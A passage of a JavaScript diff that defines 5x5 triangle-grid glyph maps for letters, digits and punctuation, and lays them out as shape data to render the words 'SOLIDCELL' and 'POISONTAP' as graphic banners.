+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//L
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-1, y:this.row*1, z:0}, 
+      map : [[0,4,0,0,0],[0,5,0,0,0],[0,5,0,0,0],[0,3,0,0,0],[0,0,3,4,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//M
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*0, y:this.row*1, z:0}, 
+      map : [[0,4,0,0,0],[0,5,4,4,0],[0,5,3,3,4],[0,3,0,0,3],[0,3,0,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//N
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*1, y:this.row*1, z:0}, 
+      map : [[0,0,0,4,0],[0,4,0,5,0],[0,5,4,4,0],[0,5,3,5,0],[0,1,0,3,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//O
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*2, y:this.row*1, z:0}, 
+      map : [[0,0,4,0,0],[0,2,1,4,0],[0,1,0,3,0],[0,3,4,1,0],[0,0,3,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+
+    {//P
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-2, y:this.row*0, z:0}, 
+      map : [[0,4,0,0,0],[0,5,3,4,0],[0,3,4,1,0],[0,5,0,0,0],[0,1,0,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//Q
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-1, y:this.row*0, z:0}, 
+      map : [[0,0,4,0,0],[0,2,1,4,0],[0,1,2,3,0],[0,3,2,5,0],[0,0,3,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//R
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*0, y:this.row*0, z:0}, 
+      map : [[0,4,0,0,0],[0,5,3,4,0],[0,3,4,1,0],[0,5,0,4,0],[0,1,0,3,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//S
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*1, y:this.row*0, z:0}, 
+      map : [[0,0,0,4,0],[0,2,1,0,0],[0,0,3,4,0],[0,3,2,1,0],[0,0,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//T
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*2, y:this.row*0, z:0}, 
+      map : [[0,2,5,1,0],[0,0,5,0,0],[0,0,5,0,0],[0,0,2,0,0],[0,0,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+
+    {//U
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-2, y:this.row*-1, z:0}, 
+      map : [[0,0,0,4,0],[0,2,0,3,0],[0,5,0,5,0],[0,5,0,1,0],[0,3,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//V
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-1, y:this.row*-1, z:0}, 
+      map : [[0,0,0,2,0],[0,0,0,5,0],[0,4,0,2,0],[0,3,4,1,0],[0,0,3,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//W
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*0, y:this.row*-1, z:0}, 
+      map : [[0,2,0,0,0],[0,2,0,0,2],[0,5,2,2,1],[0,5,1,1,0],[0,1,0,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//X
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*1, y:this.row*-1, z:0}, 
+      map : [[0,0,0,2,0],[0,4,0,1,0],[0,3,2,0,0],[0,2,1,4,0],[0,1,0,3,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//Y
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*2, y:this.row*-1, z:0}, 
+      map : [[0,0,0,2,0],[0,4,0,1,0],[0,3,2,0,0],[0,0,5,0,0],[0,0,3,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+
+    {//Z
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-2, y:this.row*-2, z:0}, 
+      map : [[0,0,0,0,0],[0,2,5,1,0],[0,0,2,1,0],[0,2,1,0,0],[2,5,1,1,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//.
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-1, y:this.row*-2, z:0}, 
+      map : [[0,0,0,0,0],[0,0,0,0,0],[0,0,0,0,0],[0,0,0,0,0],[0,5,0,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//,
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-0, y:this.row*-2, z:0}, 
+      map : [[0,0,0,0,0],[0,0,0,0,0],[0,0,0,0,0],[0,0,0,0,0],[0,1,0,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//!
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*1, y:this.row*-2, z:0}, 
+      map : [[0,0,2,0,0],[0,0,5,0,0],[0,0,5,0,0],[0,0,1,0,0],[0,0,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//?
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*2, y:this.row*-2, z:0}, 
+      map : [[0,0,2,4,0],[0,0,0,2,0],[0,0,2,1,0],[0,0,1,0,0],[0,0,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+
+    {//1
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-2, y:this.row*-3, z:0}, 
+      map : [[0,0,2,0,0],[0,0,5,0,0],[0,0,5,0,0],[0,0,5,0,0],[0,0,3,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//2
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-1, y:this.row*-3, z:0}, 
+      map : [[0,0,0,0,0],[0,0,3,4,0],[0,0,2,1,0],[0,2,1,0,0],[0,3,2,4,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//3
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*0, y:this.row*-3, z:0}, 
+      map : [[0,0,0,0,0],[0,0,3,4,0],[0,0,2,1,0],[0,0,2,1,0],[0,2,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//4
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*1, y:this.row*-3, z:0}, 
+      map : [[0,0,0,0,0],[0,0,2,1,0],[0,2,1,2,0],[0,3,2,5,0],[0,0,0,1,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//5
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*2, y:this.row*-3, z:0}, 
+      map : [[0,0,0,0,0],[0,0,2,1,0],[0,2,4,0,0],[0,0,3,4,0],[0,0,2,1,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//6
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-2, y:this.row*-4, z:0}, 
+      map : [[0,0,0,0,0],[0,2,1,0,0],[0,5,4,0,0],[0,3,0,4,0],[0,0,3,1,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//7
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-1, y:this.row*-4, z:0}, 
+      map : [[0,0,0,0,0],[0,2,1,5,0],[0,0,2,1,0],[0,2,1,0,0],[0,1,0,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//8
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*0, y:this.row*-4, z:0}, 
+      map : [[0,0,0,0,0],[0,0,2,4,0],[0,0,1,1,0],[0,2,3,4,0],[0,3,2,1,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//9
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*1, y:this.row*-4, z:0}, 
+      map : [[0,0,0,0,0],[0,2,1,4,0],[0,3,2,1,0],[0,2,1,0,0],[0,1,0,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//0
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*2, y:this.row*-4, z:0}, 
+      map : [[0,0,0,0,0],[0,0,2,4,0],[0,2,1,2,0],[0,1,2,1,0],[0,3,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    }
+    ];
+    var lastMap = 0;
+    for(var i=0; i<this.fontMapData.length; i++) {
+      for(var j=0; j<this.fontMapData[i].map.length; j++) {
+        for(var k=0; k<this.fontMapData[i].map[j].length; k++) {
+          switch(this.fontMapData[i].map[j][k]) {
+            case 0:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = 0;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : 0,
+                y : 0,
+                z : 0
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+            case 1:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:180};
+              break;
+            case 2:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+            case 3:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:90};
+              break;
+            case 4:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:270};
+              break;
+            case 5:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:180};
+
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+          };
+        };
+      };
+      lastMap += this.fontMapData[i].mapDataNum;
+    };
+    return this.returnData;
+  };
+
+
+  var fontmap_solidcell = function() {
+    this.returnData = new Array();
+    this.col = 80;
+    this.row = 160;
+    this.cellLength = 22;
+    this.cellSpace = 22;
+    for(var i=0; i<DEFIINE_instanceNum; i++) {
+      this.returnData[i] = {
+        shade : false,
+        fill : false,
+        stroke : false,
+        fillColor: {r:1.0, g:1.0, b:1.0, a:1.0},
+        strokeColor: {r:1.0, g:1.0, b:1.0, a:1.0},
+        size: 0,
+        position: {x:0, y:0, z:0},
+        rotate: {x:0, y:0, z:0}
+      };
+    };
+    this.fontMapData = [
+    {//S
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-3.5, y:this.row*0.15, z:0}, 
+      map : [[0,0,0,4,0],[0,2,1,0,0],[0,0,3,4,0],[0,3,2,1,0],[0,0,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//O
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-2.5, y:this.row*0.15, z:0}, 
+      map : [[0,0,4,0,0],[0,2,1,4,0],[0,1,0,3,0],[0,3,4,1,0],[0,0,3,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//L
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-1.5, y:this.row*0.15, z:0}, 
+      map : [[0,4,0,0,0],[0,5,0,0,0],[0,5,0,0,0],[0,3,0,0,0],[0,0,3,4,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//I
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-0.8, y:this.row*0.15, z:0}, 
+      map : [[0,0,2,0,0],[0,0,2,0,0],[0,0,5,0,0],[0,0,5,0,0],[0,0,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//D
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*0, y:this.row*0.15, z:0}, 
+      map : [[0,4,0,0,0],[0,3,3,4,0],[0,5,0,5,0],[0,5,2,1,0],[0,1,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//C
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*1, y:this.row*-0.15, z:0}, 
+      map : [[0,0,4,0,0],[0,2,1,4,0],[0,1,0,0,0],[0,3,4,1,0],[0,0,3,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//E
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*2, y:this.row*-0.15, z:0}, 
+      map : [[0,0,2,1,0],[0,2,1,0,0],[0,2,2,1,0],[0,5,0,2,0],[0,1,3,1,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//L
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*3, y:this.row*-0.15, z:0}, 
+      map : [[0,4,0,0,0],[0,5,0,0,0],[0,5,0,0,0],[0,3,0,0,0],[0,0,3,4,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//L
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*3.6, y:this.row*-0.15, z:0}, 
+      map : [[0,4,0,0,0],[0,5,0,0,0],[0,5,0,0,0],[0,3,0,0,0],[0,0,3,4,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    }
+    ];
+    var lastMap = 0;
+    for(var i=0; i<this.fontMapData.length; i++) {
+      for(var j=0; j<this.fontMapData[i].map.length; j++) {
+        for(var k=0; k<this.fontMapData[i].map[j].length; k++) {
+          switch(this.fontMapData[i].map[j][k]) {
+            case 0:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = 0;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : 0,
+                y : 0,
+                z : 0
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+            case 1:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:180};
+              break;
+            case 2:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+            case 3:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:90};
+              break;
+            case 4:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:270};
+              break;
+            case 5:
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2 + lastMap].rotate = {x:0, y:0, z:180};
+
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].shade = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].fill = true;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].stroke = false;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].size = this.fontMapData[i].cellLength/2;
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].position = {
+                x : (parseInt(k)*this.fontMapData[i].cellSpace - this.fontMapData[i].map[j].length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.x,
+                y : (-parseInt(j)*this.fontMapData[i].cellSpace - -this.fontMapData[i].map.length*this.fontMapData[i].cellSpace/2) + this.fontMapData[i].center.y,
+                z : this.fontMapData[i].center.z
+              };
+              this.returnData[j*this.fontMapData[i].colUnit+k*2+1 + lastMap].rotate = {x:0, y:0, z:0};
+              break;
+          };
+        };
+      };
+      lastMap += this.fontMapData[i].mapDataNum;
+    };
+    return this.returnData;
+  };
+
+
+  var fontmap_poisontap = function() {
+    this.returnData = new Array();
+    this.col = 80;
+    this.row = 160;
+    this.cellLength = 22;
+    this.cellSpace = 22;
+    for(var i=0; i<DEFIINE_instanceNum; i++) {
+      this.returnData[i] = {
+        shade : false,
+        fill : false,
+        stroke : false,
+        fillColor: {r:1.0, g:1.0, b:1.0, a:1.0},
+        strokeColor: {r:1.0, g:1.0, b:1.0, a:1.0},
+        size: 0,
+        position: {x:0, y:0, z:0},
+        rotate: {x:0, y:0, z:0}
+      };
+    };
+    this.fontMapData = [
+    {//P
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-4, y:this.row*0.15, z:0}, 
+      map : [[0,4,0,0,0],[0,5,3,4,0],[0,3,4,1,0],[0,5,0,0,0],[0,1,0,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//O
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-3, y:this.row*0.15, z:0}, 
+      map : [[0,0,4,0,0],[0,2,1,4,0],[0,1,0,3,0],[0,3,4,1,0],[0,0,3,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//I
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-2, y:this.row*0.15, z:0}, 
+      map : [[0,0,2,0,0],[0,0,2,0,0],[0,0,5,0,0],[0,0,5,0,0],[0,0,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//S
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*-1, y:this.row*0.15, z:0}, 
+      map : [[0,0,0,4,0],[0,2,1,0,0],[0,0,3,4,0],[0,3,2,1,0],[0,0,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//O
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*0, y:this.row*0.15, z:0}, 
+      map : [[0,0,4,0,0],[0,2,1,4,0],[0,1,0,3,0],[0,3,4,1,0],[0,0,3,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//N
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*1, y:this.row*0.15, z:0}, 
+      map : [[0,0,0,4,0],[0,4,0,5,0],[0,5,4,4,0],[0,5,3,5,0],[0,1,0,3,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//T
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*2.2, y:this.row*-0.15, z:0}, 
+      map : [[0,2,5,1,0],[0,0,5,0,0],[0,0,5,0,0],[0,0,2,0,0],[0,0,1,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//A
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*3.2, y:this.row*-0.15, z:0}, 
+      map : [[0,0,0,2,0],[0,0,2,5,0],[0,2,1,1,0],[0,1,3,5,0],[0,1,0,1,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    },
+    {//P
+      cellLength : this.cellLength,
+      cellSpace : this.cellSpace,
+      center : {x:this.col*4.2, y:this.row*-0.15, z:0}, 
+      map : [[0,4,0,0,0],[0,5,3,4,0],[0,3,4,1,0],[0,5,0,0,0],[0,1,0,0,0]],  
+      mapDataNum : 5*5*2,
+      colUnit : 5*2
+    }
+    ];
+    var lastMap = 0;
+    for(var i=0; i<this.fontMapData.length; i++) {
+      for(var j=0; j<this.fontMapData[i].map.length; j++) {
+        for(var k=0; k<this.fontMapData[i].map[j].length; k++) {
